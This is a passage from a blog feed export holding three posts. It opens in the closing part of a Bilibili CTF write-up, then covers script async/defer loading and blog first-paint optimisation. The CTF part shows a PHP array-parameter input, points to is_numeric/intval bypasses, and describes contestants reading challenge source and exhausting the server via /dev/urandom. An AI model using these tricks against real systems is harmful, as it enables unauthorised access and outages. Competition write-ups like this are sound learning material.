http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 